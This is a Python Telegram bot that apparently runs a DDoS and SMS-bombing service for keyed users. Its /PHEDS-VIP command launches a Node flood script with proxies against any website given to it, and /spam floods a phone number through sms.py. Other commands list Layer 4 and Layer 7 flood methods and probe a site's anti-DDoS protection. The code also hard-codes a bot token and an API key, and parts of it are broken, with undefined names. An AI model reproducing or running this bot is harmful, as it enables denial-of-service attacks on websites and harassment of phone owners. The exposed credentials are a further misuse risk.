import telebot
import datetime
import time
import os
import subprocess
import psutil
import sqlite3
import hashlib
import requests
import sys
import socket
import zipfile
import io
import re
import threading

bot_token = '6921849817:AAHx7lZQkFuXu420ucGQlKs05ULtQ0TM89I' 
bot = telebot.TeleBot(bot_token)

allowed_users = []
processes = []
ADMIN_ID = 6089975775
proxy_update_count = 0
last_proxy_update_time = time.time()

connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()

# Create the users table if it doesn't exist
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()
def TimeStamp():
    now = str(datetime.date.today())
    return now
def load_users_from_database():
    cursor.execute('SELECT user_id, expiration_time FROM users')
    rows = cursor.fetchall()
    for row in rows:
        user_id = row[0]
        expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        if expiration_time > datetime.datetime.now():
            allowed_users.append(user_id)

def save_user_to_database(connection, user_id, expiration_time):
    cursor = connection.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, expiration_time)
        VALUES (?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
    connection.commit()
@bot.message_handler(commands=['add'])
def add_user(message):
    admin_id = message.from_user.id
    if admin_id != ADMIN_ID:
        bot.reply_to(message, 'For Admin Only')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Enter the correct format /add + [id]')
        return

    user_id = int(message.text.split()[1])
    allowed_users.append(user_id)
    expiration_time = datetime.datetime.now() + datetime.timedelta(days=30)
    connection = sqlite3.connect('user_data.db')
    save_user_to_database(connection, user_id, expiration_time)
    connection.close()

    bot.reply_to(message, f'Add User with ID: {user_id} Use the command for 30 days')


load_users_from_database()

@bot.message_handler(commands=['getkey'])
def laykey(message):
    with open('key.txt', 'a') as f:
        f.close()

    username = message.from_user.username
    string = f'GL-{username}+{TimeStamp()}'
    hash_object = hashlib.md5(string.encode())
    key = str(hash_object.hexdigest())
    print(key)
    
    try:
        response = requests.get(f'https://link4m.co/api-shorten/v2?api=650052128c48484de71ab0ef&url=https://viduchung.info/key/?key={key}')
        response_json = response.json()
        if 'shortenedUrl' in response_json:
            url_key = response_json['shortenedUrl']
        else:
            url_key = "Retrieve Key Error, Please Reuse Command /getkey"
    except requests.exceptions.RequestException as e:
        url_key = "Retrieve Key Error, Please Reuse Command /getkey"
    
    text = f'''
━➤ GET SUCCESS KEY
━➤ Today's key for Link is here {url_key}
    '''
    bot.reply_to(message, text)

@bot.message_handler(commands=['key'])
def key(message):
    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Please Enter Key')
        return

    user_id = message.from_user.id

    key = message.text.split()[1]
    username = message.from_user.username
    string = f'GL-{username}+{TimeStamp()}'
    hash_object = hashlib.md5(string.encode())
    expected_key = str(hash_object.hexdigest())
    if key == expected_key:
        allowed_users.append(user_id)
        bot.reply_to(message, 'Key Entered Successfully\nYou Are Allowed to Use All Free Commands')
    else:
        bot.reply_to(message, 'Incorrect or Expired\nDo Not Use Other People Keys!')
@bot.message_handler(commands=['start', 'help'])
def help(message):
    help_text = '''
┏━━━━━━━━━━━━━━┓
┃  Getkey + Enter Key
┗━━━━━━━━━━━━━━➤
- /getkey : To get a free key
- /key <key just obtained> : To enter a free key

- /muakey : To get a VIP key
- /nhapkey <key just purchased> : To enter a VIP key
┏━━━━━━━━━━━━━━┓
┃  Free Commands
┗━━━━━━━━━━━━━━➤
- /spam <phone number> : To perform spam
- /ddosfree <website link> : To launch a ddos attack
┏━━━━━━━━━━━━━━┓
┃  Useful Commands
┗━━━━━━━━━━━━━━➤
- /check <website link> : Check the anti ddos capability of a website (Not 100% accurate)
- /code <website link> : To get the html code of a website
- /proxy : Check the number of proxies the bot is using
- /time : View the time the BOT has been active
- /admin : Admin's social media list
'''
    bot.reply_to(message, help_text)
@bot.message_handler(commands=['tmute'])
def tmute(message):
    pass
@bot.message_handler(commands=['muakey'])
def muakey(message):
    pass
@bot.message_handler(commands=['nhapkey'])
def nhapkeyvip(message):
    pass
@bot.message_handler(commands=['vip'])
def vipsms(message):
    pass
@bot.message_handler(commands=['ddos'])
def didotv(message):
    pass
@bot.message_handler(commands=['setflood'])
def aygspws(message):
    pass
@bot.message_handler(commands=['methods'])
def methods(message):
    help_text = '''
--- LAYER 7 ---
CF-BYPASS
HTTP-LOAD
FLOOD
--- LAYER 4 ---
TCP-FLOOD
UDP-FLOOD
'''
    bot.reply_to(message, help_text)

allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 90:
                cmd_process.terminate()
                bot.reply_to(message, "Attack command stopped. Thank you for using it.")
                return
        # Check if the attack duration has been reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return

@bot.message_handler(commands=['PHEDS-VIP'])
def ddos_command(message):
    user_id = message.from_user.id
    
    if not is_bot_active:
        bot.reply_to(message, 'Please wait until its turned back on.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Please enter the Key.\nUse the command /getkey to retrieve the Key.')
        return

    if len(message.text.split()) < 2:
        bot.reply_to(message, 'Please enter the correct syntax.\nExample: /PHEDS-VIP <website link>')
        return

    username = message.from_user.username

    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 120:
        remaining_time = int(120 - (current_time - cooldown_dict[username].get('attack', 0)))
        bot.reply_to(message, f"@{username} Please wait. {remaining_time} Seconds before reusing the /attack command.")
        return
    
    host = message.text.split()[1]
    command = ["node", "PHEDS-VIP.js", POST, host, "proxy.txt", "300", "512", "10", "443"]
    duration = 300

    cooldown_dict[username] = {'attack': current_time}

    attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
    attack_thread.start()
    bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃   Successful Attack!!!\n┗━━━━━━━━━━━━━━➤\n  ┏➤Admin : iz u nbi?L ➤ TấPowered by» {username} «\n  ➤ Host » {host} «\n  ➤ TIME » 300s «\n  ➤ Methods » PHEDS-VIP «\n  ➤ Cooldown » 120s «\n  ➤ Plan » Free «\n  ┗➤Bot Earn money @Hulksecbot')


@bot.message_handler(commands=['proxy'])
def proxy_command(message):
    user_id = message.from_user.id
    if user_id in allowed_users:
        try:
            with open("proxy.txt", "r") as proxy_file:
                proxies = proxy_file.readlines()
                num_proxies = len(proxies)
                bot.reply_to(message, f"Number of proxies: {num_proxies}")
        except FileNotFoundError:
            bot.reply_to(message, "Proxy.txt file not found..")
    else:
        bot.reply_to(message, 'Please enter the Key.\nUse the command /getkey to retrieve the Key.')

def send_proxy_update():
    while True:
        try:
            with open("proxy.txt", "r") as proxy_file:
                proxies = proxy_file.readlines()
                num_proxies = len(proxies)
                proxy_update_message = f"The number of newly updated proxies is: {num_proxies}"
                bot.send_message(allowed_group_id, proxy_update_message)
        except FileNotFoundError:
            pass
        time.sleep(3600)  # Wait for 10 minutes

@bot.message_handler(commands=['cpu'])
def check_cpu(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'You do not have permission to use this command..')
        return

    cpu_usage = psutil.cpu_percent(interval=1)
    memory_usage = psutil.virtual_memory().percent

    bot.reply_to(message, f'🖥️ CPU Usage: {cpu_usage}%\n💾 Memory Usage: {memory_usage}%')

@bot.message_handler(commands=['off'])
def turn_off(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'You are not authorized to use this command.')
        return

    global is_bot_active
    is_bot_active = False
    bot.reply_to(message, 'The bot has been turned off. All users cannot use any other commands.')

@bot.message_handler(commands=['on'])
def turn_on(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'You do not have permission to use this command.')
        return

    global is_bot_active
    is_bot_active = True
    bot.reply_to(message, 'The bot has been restarted. All users can now use commands as usual.')

is_bot_active = True
@bot.message_handler(commands=['code'])
def code(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'The bot is currently turned off. Please wait until it is turned back on.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Please enter the Key.\nUse the command /getkey to obtain the Key')
        return
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Please enter the correct syntax.\nExample: /code + [website link]')
        return

    url = message.text.split()[1]

    try:
        response = requests.get(url)
        if response.status_code != 200:
            bot.reply_to(message, 'Unable to fetch source code from this website. Please check the URL again.')
            return

        content_type = response.headers.get('content-type', '').split(';')[0]
        if content_type not in ['text/html', 'application/x-php', 'text/plain']:
            bot.reply_to(message, 'The website is not HTML or PHP. Please try with a URL that contains an HTML or PHP file.')
            return

        source_code = response.text

        zip_file = io.BytesIO()
        with zipfile.ZipFile(zip_file, 'w') as zipf:
            zipf.writestr("source_code.txt", source_code)

        zip_file.seek(0)
        bot.send_chat_action(message.chat.id, 'upload_document')
        bot.send_document(message.chat.id, zip_file)

    except Exception as e:
        bot.reply_to(message, f'Có lỗi xảy ra: {str(e)}')

@bot.message_handler(commands=['check'])
def check_ip(message):
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Please enter the correct syntax.\nExample: /check + [website link]')
        return

    url = message.text.split()[1]
    
    # Kiểm tra xem URL có http/https chưa, nếu chưa thêm vào
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    # Loại bỏ tiền tố "www" nếu có
    url = re.sub(r'^(http://|https://)?(www\d?\.)?', '', url)
    
    try:
        ip_list = socket.gethostbyname_ex(url)[2]
        ip_count = len(ip_list)

        reply = f"IP : {url}\nLà: {', '.join(ip_list)}\n"
        if ip_count == 1:
            reply += "The likelihood of not having Anti-DDoS is high"
        else:
            reply += "The likelihood of having Anti-DDoS is very high"

        bot.reply_to(message, reply)
    except Exception as e:
        bot.reply_to(message, f"An error has occurred: {str(e)}")

@bot.message_handler(commands=['admin'])
def send_admin_link(message):
    bot.reply_to(message, "Telegram: https://t.me/izunbi")

# Hàm tính thời gian hoạt động của bot
start_time = time.time()

proxy_update_count = 0
proxy_update_interval = 600 

@bot.message_handler(commands=['getproxy'])
def get_proxy_info(message):
    user_id = message.from_user.id
    global proxy_update_count

    if not is_bot_active:
        bot.reply_to(message, 'The bot is currently turned off. Please wait until its turned back on.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Please enter the Key.\nUse the command /getkey to obtain the Key')
        return

    try:
        with open("proxybynhakhoahoc.txt", "r") as proxy_file:
            proxy_list = proxy_file.readlines()
            proxy_list = [proxy.strip() for proxy in proxy_list]
            proxy_count = len(proxy_list)
            proxy_message = f'10 Auto Update Interval\nQuantity proxy: {proxy_count}\n'
            bot.send_message(message.chat.id, proxy_message)
            bot.send_document(message.chat.id, open("proxybynhakhoahoc.txt", "rb"))
            proxy_update_count += 1
    except FileNotFoundError:
        bot.reply_to(message, "Proxy.txt file not found.")


@bot.message_handler(commands=['time'])
def show_uptime(message):
    current_time = time.time()
    uptime = current_time - start_time
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    seconds = int(uptime % 60)
    uptime_str = f'{hours} time, {minutes} minutes, {seconds} seconds'
    bot.reply_to(message, f'The bot is now operational: {uptime_str}')

allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

def run_sms(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 180:
                cmd_process.terminate()
                bot.reply_to(message, "The attack command has been stopped. Thank you for using it.")
                return
        # Check if the attack duration has been reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return


@bot.message_handler(commands=['spam'])
def attack_command(message):
    user_id = message.from_user.id
    
    if not is_bot_active:
        bot.reply_to(message, 'Bot is currently turned off. Please wait until its turned back on.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Please enter the Key.\nUse the /getkey command to obtain the Key')
        return

    if len(message.text.split()) < 2:
        bot.reply_to(message, 'Please enter the correct syntax.\nExample: /spam <phone number>')
        return

    username = message.from_user.username

    args = message.text.split()
    phone_number = args[1]

    blocked_numbers = ['113', '114', '115', '198', '911', '0393366620']
    if phone_number in blocked_numbers:
        bot.reply_to(message, 'You are not allowed to spam this number.')
        return

    if user_id in cooldown_dict and time.time() - cooldown_dict[user_id] < 90:
        remaining_time = int(90 - (time.time() - cooldown_dict[user_id]))
        bot.reply_to(message, f'Please wait {remaining_time} seconds before continuing to use this command.')
        return
    
    cooldown_dict[user_id] = time.time()

    # Define the attack command and duration here
    command = ["python", "sms.py", phone_number, "+63"]
    duration = 180

    attack_thread = threading.Thread(target=run_sms, args=(command, duration, message))
    attack_thread.start()
    bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃   Spam Thành Công!!!\n┗━━━━━━━━━━━━━━➤\n┏━━━━━━━━━━━━━━┓\n┣➤ User: @{username} \n┣➤ Phone: {phone_number} \n┣➤ Time: {duration} Giây\n┣➤ Plan: Free \n┣➤ Admin: iz u nbi?\n┗━━━━━━━━━━━━━━➤')

@bot.message_handler(func=lambda message: message.text.startswith('/'))
def invalid_command(message):
    bot.reply_to(message, 'Invalid command. Please use the /help command to see the list of commands.')

bot.infinity_polling(timeout=60, long_polling_timeout = 1)
